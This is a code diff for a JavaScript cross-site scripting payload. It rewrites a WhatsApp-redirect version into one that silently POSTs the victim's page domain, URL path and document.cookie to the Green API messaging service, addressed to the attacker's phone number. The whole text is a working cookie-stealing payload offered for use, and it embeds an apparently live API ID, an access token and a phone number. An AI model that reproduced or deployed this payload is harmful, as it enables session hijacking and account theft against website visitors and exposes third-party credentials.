@@ -1,12 +1,24 @@
-var phoneNumber = '18056009130'; // Replace with the target phone number
-var messageContent = 'XSS Alert in ' + document.domain +
-    '%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document.location.hostname + document.location.pathname +
-    '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document.cookie;
+var greenApiId = '7103905514'; // Replace with your Green API ID
+var greenApiToken = 'a73d4e98539945968bd6f1bbac660b95a3e06dcf96b24100ab'; // Replace with your Green API Token
+var defaultPhoneNumber = '18056009130'; // Replace with your default phone number
 
-function whatsappSend(phoneNumber, messageContent) {
-    // Replace the following line with the appropriate WhatsApp API endpoint and authentication
-    var apiUrl = 'https://api.whatsapp.com/send/?phone=' + phoneNumber + '&text=' + encodeURIComponent(messageContent);
-    window.location.href = apiUrl;
+function sendWhatsAppMessage(greenApiId, greenApiToken, phoneNumber) {
+    var textData = 'XSS Alert in ' + document.domain +
+        '\n------------------------------------------------' +
+        '\n\n- URL Target -\n' + document.location.hostname + document.location.pathname +
+        '\n\n- Document Cookie -\n' + document.cookie;
+
+    var url = 'https://api.green-api.com/waInstance' + greenApiId + '/sendMessage/' + greenApiToken;
+    var payload = {
+        chatId: phoneNumber,
+        text: textData,
+    };
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify(payload));
 }
 
-whatsappSend(phoneNumber, messageContent);
+// Example usage:
+sendWhatsAppMessage(greenApiId, greenApiToken, defaultPhoneNumber);
